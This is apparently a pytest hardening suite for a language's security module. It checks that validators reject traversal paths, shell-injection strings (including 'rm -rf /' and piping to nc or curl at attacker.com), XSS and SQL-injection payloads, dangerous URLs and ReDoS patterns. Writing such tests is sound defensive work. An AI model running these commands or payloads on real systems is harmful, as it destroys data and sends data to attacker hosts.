"""
Security negative-path hardening matrix.

Each parameterized case proves that a dangerous input is rejected by the
security layer.  The matrix covers:

  - Path validation: traversal techniques, null bytes, UNC/Windows paths,
    encoded separators, absolute-path rejection
  - Subprocess: shell-metacharacter injection vectors
  - URL validation: dangerous schemes, CRLF injection, credential-embedding
  - SQL identifier sanitization: injection keywords, unicode category bypass
  - Integer validation: non-numeric, float, hex, out-of-bounds
  - HTML escaping: known XSS payloads round-trip intact after escaping
  - Regex safety: ReDoS patterns
  - Filename sanitization: traversal residues, null bytes, pure-dot names
  - Permission manager: scope escape, revoke-then-check, escalation
  - Taint analysis: multi-source sink propagation, all defined sinks rejected
  - CFI checker: unregistered indirect call, non-callable dispatch
  - Memory safety: use-after-free, double-free idempotency, type-confusion index
"""

import pytest

from nexuslang.security import (
    PermissionType,
    PermissionDeniedError,
    PermissionManager,
    PathTraversalError,
    CommandInjectionError,
    ValidationError,
    validate_path,
    safe_execute,
    validate_url,
    sanitize_sql_identifier,
    escape_html,
    get_safe_filename,
    is_safe_regex,
)
from nexuslang.security.analysis import (
    AnalysisPolicy,
    ViolationPolicy,
    TaintLabel,
    TaintSink,
    TaintTracker,
    TaintViolation,
    CFIChecker,
    CFIViolation,
    MemorySafetyValidator,
    BoundsError,
    UseAfterFreeError,
    MemorySafetyViolation,
    set_analysis_policy,
    get_analysis_policy,
)


# =============================================================================
# Path validation: negative paths
# =============================================================================

PATH_TRAVERSAL_CASES = [
    # (description, path, kwargs)
    ("dot-dot-slash",          "../etc/passwd",              {}),
    ("double-dot-dot-slash",   "../../secret.txt",           {}),
    ("deep traversal",         "a/b/c/../../../etc/shadow",  {}),
    ("backslash traversal",    "a\\..\\secret.txt",          {}),
    ("null byte mid-path",     "safe\x00/etc/passwd",        {}),
    ("null byte at end",       "file.txt\x00",               {}),
    ("null byte at start",     "\x00badfile",                {}),
    ("absolute without flag",  "/etc/passwd",                {}),
    ("double slash prefix",    "//etc/passwd",               {}),
    ("current-dot traversal",  "./../../secret",             {}),
]


@pytest.mark.parametrize("description,path,kwargs", PATH_TRAVERSAL_CASES,
                          ids=[c[0] for c in PATH_TRAVERSAL_CASES])
def test_path_traversal_rejected(description, path, kwargs):
    with pytest.raises(PathTraversalError):
        validate_path(path, **kwargs)


# =============================================================================
# Safe subprocess: injection vectors
# =============================================================================

INJECTION_CASES = [
    # (description, program)
    ("semicolon separator",   "ls; rm -rf /"),
    ("pipe chaining",         "cat | nc attacker.com 1337"),
    ("ampersand background",  "ls & curl attacker.com"),
    ("backtick substitution", "`rm -rf /`"),
    ("dollar subshell",       "$(id)"),
    ("output redirection",    "echo > /etc/passwd"),
    ("input redirection",     "cat < /etc/shadow"),
    ("newline injection",     "echo\nrm -rf /"),       # actual newline character
    ("carriage-return inject","echo\rrm -rf /"),        # actual carriage return
]


@pytest.mark.parametrize("description,program", INJECTION_CASES,
                          ids=[c[0] for c in INJECTION_CASES])
def test_command_injection_blocked(description, program):
    with pytest.raises(CommandInjectionError):
        safe_execute(program, [])


# =============================================================================
# URL validation: dangerous schemes and injection
# =============================================================================

DANGEROUS_URL_CASES = [
    # (description, url, allowed_schemes)
    ("javascript scheme",      "javascript:alert(1)",        None),
    ("data URI",               "data:text/html,<h1>x</h1>",  None),
    ("vbscript scheme",        "vbscript:msgbox(1)",         None),
    ("file URI",               "file:///etc/passwd",         ["http", "https"]),
    ("ftp blocked by scheme",  "ftp://files.example.com",    ["https"]),
    ("scheme-less URL",        "example.com/path",           None),
    ("plain string",           "not a url at all",           None),
    ("empty string",           "",                           None),
    ("protocol-relative",      "//evil.com/steal",           None),
]


@pytest.mark.parametrize("description,url,allowed_schemes", DANGEROUS_URL_CASES,
                          ids=[c[0] for c in DANGEROUS_URL_CASES])
def test_dangerous_url_rejected(description, url, allowed_schemes):
    kwargs = {"allowed_schemes": allowed_schemes} if allowed_schemes is not None else {}
    result = validate_url(url, **kwargs)
    assert not result, (
        f"Expected validate_url to return False for {description!r}: {url!r}"
    )


# =============================================================================
# SQL identifier sanitization: injection vectors
# =============================================================================

SQL_INJECTION_CASES = [
    # (description, identifier)
    ("drop statement",             "users; DROP TABLE users;"),
    ("inline comment",             "users--"),
    ("block comment",              "users/* comment */"),
    ("numeric start",              "123table"),
    ("dash in name",               "my-table"),
    ("space in name",              "table name"),
    ("single quote",               "table'name"),
    ("double quote",               'table"name'),
    ("reserved: select",           "select"),
    ("reserved: insert",           "insert"),
    ("reserved: update",           "update"),
    ("reserved: delete",           "delete"),
    ("reserved: drop",             "drop"),
    ("reserved: create",           "create"),
    ("reserved: alter",            "alter"),
    ("reserved: union",            "union"),
    ("reserved: from",             "from"),
    ("reserved: where",            "where"),
]


@pytest.mark.parametrize("description,identifier", SQL_INJECTION_CASES,
                          ids=[c[0] for c in SQL_INJECTION_CASES])
def test_sql_identifier_injection_rejected(description, identifier):
    with pytest.raises(ValidationError):
        sanitize_sql_identifier(identifier)


# =============================================================================
# Integer validation: non-numeric and out-of-bounds
# =============================================================================

from nexuslang.security import validate_integer


INTEGER_REJECTION_CASES = [
    # (description, value, min_val, max_val)
    ("alphabetic",      "abc",   None,  None),
    ("float string",    "3.14",  None,  None),
    ("hex string",      "0xFF",  None,  None),
    ("empty string",    "",      None,  None),
    ("below min",       "0",     1,     100),
    ("above max",       "101",   1,     100),
    ("way below min",   "-999",  0,     100),
    ("way above max",   "9999",  0,     100),
]


@pytest.mark.parametrize("description,value,min_val,max_val", INTEGER_REJECTION_CASES,
                          ids=[c[0] for c in INTEGER_REJECTION_CASES])
def test_integer_validation_rejects(description, value, min_val, max_val):
    result = validate_integer(value, min_val=min_val, max_val=max_val)
    assert not result, (
        f"Expected validate_integer to return False for {description!r}: {value!r}"
    )


# =============================================================================
# HTML escaping: XSS payloads must not survive round-trip
# =============================================================================

XSS_PAYLOAD_CASES = [
    # (description, payload, forbidden_substrings)
    ("script tag",           '<script>alert(1)</script>',     ["<script>", "</script>"]),
    ("img onerror",          '<img src=x onerror=alert(1)>',  ["<img"]),
    ("svg onload",           '<svg onload=alert(1)>',         ["<svg"]),
    ("a href javascript",    '<a href="javascript:void(0)">',  ["<a"]),
    ("unquoted attribute",   '<div onclick=alert(1)>',         ["<div"]),
    ("angle bracket only",   "<",                              ["<"]),
    ("closing angle",        ">",                              [">"]),
    ("ampersand",            "&entity;",                      ["&entity;"]),
    ("double quote",         '"value"',                        ['"']),
    ("forward slash",        "</script>",                     ["</script>"]),
]


@pytest.mark.parametrize("description,payload,forbidden", XSS_PAYLOAD_CASES,
                          ids=[c[0] for c in XSS_PAYLOAD_CASES])
def test_html_xss_payload_neutralized(description, payload, forbidden):
    escaped = escape_html(payload)
    for fragment in forbidden:
        assert fragment not in escaped, (
            f"Dangerous fragment {fragment!r} survived escape in {description!r}; "
            f"result was: {escaped!r}"
        )


# =============================================================================
# Regex safety: ReDoS patterns
# =============================================================================

REDOS_CASES = [
    # (description, pattern)
    ("too long",               "a" * 1001),
    ("nested quantifier +",    "(a+)+b"),
    ("nested quantifier *",    "(a*)*b"),
    ("alternation explosion",  "(a|a)+b"),
    ("complex repetition",     "(a{1,}){1,}b"),
]


@pytest.mark.parametrize("description,pattern", REDOS_CASES,
                          ids=[c[0] for c in REDOS_CASES])
def test_redos_pattern_rejected(description, pattern):
    assert not is_safe_regex(pattern), (
        f"Expected is_safe_regex to return False for ReDoS pattern {description!r}"
    )


# =============================================================================
# Filename sanitization: traversal residues and dangerous names
# =============================================================================

FILENAME_CASES = [
    # (description, filename, must_not_contain)
    ("path traversal basename", "../../../etc/passwd",   ["..", "/"]),
    ("absolute path",           "/etc/passwd",           ["/"]),
    ("hidden file prefix",      ".hidden",               []),      # starts with _ not .
    ("null byte",               "file\x00.txt",          ["\x00"]),
    ("script tag in name",      "file<script>.txt",       ["<", ">"]),
    ("semicolon in name",       "file;rm.txt",            [";"]),
    ("space-only name",         "   ",                   []),      # must not be empty after safe
    ("pure dot",                "..",                    [".."]),
]


@pytest.mark.parametrize("description,filename,must_not_contain", FILENAME_CASES,
                          ids=[c[0] for c in FILENAME_CASES])
def test_filename_sanitized(description, filename, must_not_contain):
    result = get_safe_filename(filename)
    assert result, f"get_safe_filename must not return empty string for {description!r}"
    for forbidden in must_not_contain:
        assert forbidden not in result, (
            f"Forbidden fragment {forbidden!r} still present after sanitizing "
            f"{description!r}; result was: {result!r}"
        )
    if filename.startswith("."):
        assert not result.startswith("."), (
            f"Hidden-file prefix '.' must not remain after sanitizing {description!r}"
        )


# =============================================================================
# Permission manager: scope bypass and escalation
# =============================================================================

class TestPermissionNegativePaths:

    def test_scoped_read_blocked_outside_scope(self):
        mgr = PermissionManager()
        mgr.grant(PermissionType.READ, ["/home/user/data/"])
        with pytest.raises(PermissionDeniedError):
            mgr.check(PermissionType.READ, "/etc/passwd")

    def test_revoke_then_check_raises(self):
        mgr = PermissionManager()
        mgr.grant(PermissionType.WRITE)
        mgr.revoke(PermissionType.WRITE)
        with pytest.raises(PermissionDeniedError):
            mgr.check(PermissionType.WRITE, "/tmp/output.txt")

    def test_revoke_ungranted_does_not_grant(self):
        mgr = PermissionManager()
        mgr.revoke(PermissionType.FFI)
        assert not mgr.has_permission(PermissionType.FFI)

    def test_net_not_granted_by_read_grant(self):
        mgr = PermissionManager()
        mgr.grant(PermissionType.READ)
        with pytest.raises(PermissionDeniedError):
            mgr.check(PermissionType.NET, "api.example.com")

    def test_asm_not_granted_by_ffi_grant(self):
        mgr = PermissionManager()
        mgr.grant(PermissionType.FFI)
        with pytest.raises(PermissionDeniedError):
            mgr.check(PermissionType.ASM, "some_block")

    def test_wildcard_scope_does_not_bleed_to_other_types(self):
        mgr = PermissionManager()
        mgr.grant(PermissionType.READ)
        with pytest.raises(PermissionDeniedError):
            mgr.check(PermissionType.RUN, "/usr/bin/bash")

    def test_scoped_net_blocked_for_unlisted_host(self):
        mgr = PermissionManager()
        mgr.grant(PermissionType.NET, ["api.internal.example.com"])
        with pytest.raises(PermissionDeniedError):
            mgr.check(PermissionType.NET, "evil.com")


# =============================================================================
# Taint tracker: all sinks reject tainted values
# =============================================================================

ALL_SINKS = [sink for sink in TaintSink]
ALL_LABELS = [
    TaintLabel.USER_INPUT,
    TaintLabel.NETWORK,
    TaintLabel.FFI_RETURN,
    TaintLabel.ENV_VAR,
    TaintLabel.FILE_READ,
]

TAINT_SINK_CASES = [
    (label.name, sink.name, label, sink)
    for label in ALL_LABELS
    for sink in ALL_SINKS
]


@pytest.mark.parametrize("label_name,sink_name,label,sink", TAINT_SINK_CASES,
                          ids=[f"{c[0]}->{c[1]}" for c in TAINT_SINK_CASES])
def test_taint_sink_rejects_untrusted(label_name, sink_name, label, sink):
    policy = AnalysisPolicy(taint_policy=ViolationPolicy.RAISE)
    tracker = TaintTracker(policy=policy)
    tainted = tracker.taint("user_controlled_data", label, "test source")
    with pytest.raises(TaintViolation):
        tracker.check_sink(tainted, sink, location="line 1")


def test_taint_propagation_preserves_taint_through_concat():
    tracker = TaintTracker()
    raw = tracker.taint("DROP TABLE", TaintLabel.USER_INPUT, "stdin")
    derived = raw.propagate("SELECT * FROM users WHERE name='" + raw.value + "'", raw)
    policy = AnalysisPolicy(taint_policy=ViolationPolicy.RAISE)
    checking_tracker = TaintTracker(policy=policy)
    with pytest.raises(TaintViolation):
        checking_tracker.check_sink(derived, TaintSink.SQL_QUERY, location="line 7")


def test_taint_multisource_highest_label_wins():
    t1 = TaintTracker()
    t2 = TaintTracker()
    file_val = t1.taint("file_data", TaintLabel.FILE_READ, "disk")
    net_val = t2.taint("net_data", TaintLabel.NETWORK, "socket")
    combined = file_val.propagate(file_val.value + net_val.value, net_val)
    assert combined.dominant_label == TaintLabel.NETWORK


def test_trusted_value_passes_all_sinks():
    policy = AnalysisPolicy(taint_policy=ViolationPolicy.RAISE)
    tracker = TaintTracker(policy=policy)
    trusted = "SELECT id FROM products WHERE id = 1"
    for sink in TaintSink:
        # Must not raise for a plain (non-tainted) string
        tracker.check_sink(trusted, sink, location="trusted test")


# =============================================================================
# CFI checker: unregistered and non-callable
# =============================================================================

class TestCFINegativePaths:

    def test_unregistered_callable_raises(self):
        cfi = CFIChecker()
        def legit(): pass
        def rogue(): pass
        cfi.call_graph.register_callable(legit, "legit")
        with pytest.raises(CFIViolation):
            cfi.check_call(rogue, location="line 20")

    def test_non_callable_raises(self):
        cfi = CFIChecker()
        with pytest.raises(CFIViolation):
            cfi.check_call(42, location="line 30")

    def test_none_as_callee_raises(self):
        cfi = CFIChecker()
        with pytest.raises(CFIViolation):
            cfi.check_call(None, location="line 40")

    def test_wrong_target_at_registered_site_raises(self):
        cfi = CFIChecker()
        def allowed(): pass
        def other(): pass
        cfi.call_graph.register_callable(allowed, "allowed")
        cfi.call_graph.register_callable(other, "other")
        cfi.call_graph.register_call_site("callback_site", [allowed], location="line 50")
        with pytest.raises(CFIViolation):
            cfi.check_call(other, site_name="callback_site", location="line 55")

    def test_frame_id_mismatch_raises(self):
        cfi = CFIChecker()
        frame_id = cfi.enter_frame("func_a")
        with pytest.raises(CFIViolation):
            cfi.exit_frame(frame_id + 99, "func_a", location="line 60")

    def test_function_name_mismatch_raises(self):
        cfi = CFIChecker()
        frame_id = cfi.enter_frame("func_a")
        with pytest.raises(CFIViolation):
            cfi.exit_frame(frame_id, "func_b", location="line 70")

    def test_exit_empty_stack_raises(self):
        cfi = CFIChecker()
        with pytest.raises(CFIViolation):
            cfi.exit_frame(1, "func_a", location="line 80")


# =============================================================================
# Memory safety: use-after-free, type confusion, double-free idempotency
# =============================================================================

class TestMemorySafetyNegativePaths:

    def test_use_after_free_raises(self):
        validator = MemorySafetyValidator()
        addr = 0xDEADBEEF
        validator.record_alloc(addr)
        validator.record_free(addr)
        with pytest.raises(UseAfterFreeError):
            validator.check_not_freed(addr, location="line 10")

    def test_realloc_clears_freed_record(self):
        validator = MemorySafetyValidator()
        addr = 0xCAFEBABE
        validator.record_alloc(addr)
        validator.record_free(addr)
        validator.record_alloc(addr)
        # Must not raise after re-allocation
        validator.check_not_freed(addr, location="line 20")

    def test_double_free_still_detects_second_access(self):
        validator = MemorySafetyValidator()
        addr = 0xBAADF00D
        validator.record_alloc(addr)
        validator.record_free(addr)
        validator.record_free(addr)
        with pytest.raises(UseAfterFreeError):
            validator.check_not_freed(addr, location="line 30")

    def test_float_index_raises_type_confusion(self):
        validator = MemorySafetyValidator()
        with pytest.raises(MemorySafetyViolation):
            validator.check_index_no_overflow(3.14, location="line 40")

    def test_string_index_raises_type_confusion(self):
        validator = MemorySafetyValidator()
        with pytest.raises(MemorySafetyViolation):
            validator.check_index_no_overflow("5", location="line 50")

    def test_none_index_raises_type_confusion(self):
        validator = MemorySafetyValidator()
        with pytest.raises(MemorySafetyViolation):
            validator.check_index_no_overflow(None, location="line 60")

    def test_bounds_oob_positive_raises(self):
        validator = MemorySafetyValidator()
        with pytest.raises(BoundsError):
            validator.check_bounds(10, 5, location="line 70")

    def test_bounds_oob_negative_raises(self):
        validator = MemorySafetyValidator()
        with pytest.raises(BoundsError):
            validator.check_bounds(-6, 5, location="line 80")

    def test_bounds_empty_buffer_raises(self):
        validator = MemorySafetyValidator()
        with pytest.raises(BoundsError):
            validator.check_bounds(0, 0, location="line 90")

    @pytest.mark.parametrize("index,size", [
        (5, 5),    # exactly at size boundary
        (6, 5),    # one past the end
        (100, 5),  # far past the end
    ])
    def test_bounds_at_and_past_boundary(self, index, size):
        validator = MemorySafetyValidator()
        with pytest.raises(BoundsError):
            validator.check_bounds(index, size, location="boundary test")
